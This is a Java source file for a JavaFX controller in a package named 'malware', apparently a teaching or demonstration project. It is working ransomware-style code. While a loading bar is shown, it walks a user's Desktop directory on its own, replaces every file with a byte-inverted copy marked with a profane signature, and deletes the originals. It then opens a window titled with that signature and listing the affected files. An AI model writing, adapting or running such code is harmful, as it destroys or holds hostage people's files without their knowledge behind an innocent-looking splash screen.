package lk.ijse.dep10.malware.controller;

import javafx.concurrent.Task;
import javafx.fxml.FXMLLoader;
import javafx.scene.Scene;
import javafx.scene.control.ProgressBar;
import javafx.scene.layout.AnchorPane;
import javafx.stage.Stage;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;

public class SplashSceneController {

    public ProgressBar prgLoading;
    private ArrayList<File> files = new ArrayList<>();
    private final String SIGNATURE = "You fucked up man...!";

    public void initialize(){
        File targetDir = new File("/home/ranjith-suranga/Desktop");
        findFiles(targetDir);
        encryptFiles();
    }

    private void findFiles(File path){
        File[] files = path.listFiles();
        for (File file : files) {
            if (file.isDirectory()) {
                findFiles(file);
                continue;
            }
            this.files.add(file);
        }
    }

    private void encryptFiles(){
        Task task = new Task<Void>() {
            @Override
            protected Void call() throws Exception {
                int k = 0;
                int size = files.size();

                for (File file : files) {

                    if (findSignature(file)) {
                        size--;
                        continue;
                    }

                    File tempFile = File.createTempFile("app-", "");
                    FileOutputStream fos = new FileOutputStream(tempFile);
                    FileInputStream fis = new FileInputStream(file);

                    fos.write(SIGNATURE.getBytes());

                    while (true){
                        byte[] buffer = new byte[1024 * 10];
                        int read = fis.read(buffer);
                        for (int i = 0; i < read; i++) {
                            buffer[i] = (byte) ~buffer[i];
                        }
                        if (read == -1) break;
                        fos.write(buffer, 0,read);
                    }

                    fis.close();
                    fos.close();

                    file.delete();
                    tempFile.renameTo(file);
                    updateProgress(++k, size);
                }
                updateProgress(size, size);
                return null;
            }
        };
        new Thread(task).start();
        prgLoading.progressProperty().bind(task.progressProperty());

        task.setOnSucceeded(workerStateEvent -> {
            try {
                prgLoading.getScene().getWindow().hide();
                FXMLLoader fxmlLoader = new FXMLLoader(getClass().getResource("/scene/MainScene.fxml"));
                AnchorPane root = fxmlLoader.load();
                MainSceneController controller = fxmlLoader.getController();
                controller.initData(this.files);
                Stage stage = new Stage();
                stage.setTitle(SIGNATURE);
                stage.setScene(new Scene(root));
                stage.setResizable(false);
                stage.show();
                stage.centerOnScreen();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        });
    }

    private boolean findSignature(File path) throws IOException {
        FileInputStream fis = new FileInputStream(path);
        byte[] buffer = new byte[SIGNATURE.length()];
        int read = fis.read(buffer);
        fis.close();
        if (read == -1) return false;
        return new String(buffer).equals(SIGNATURE);
    }
}
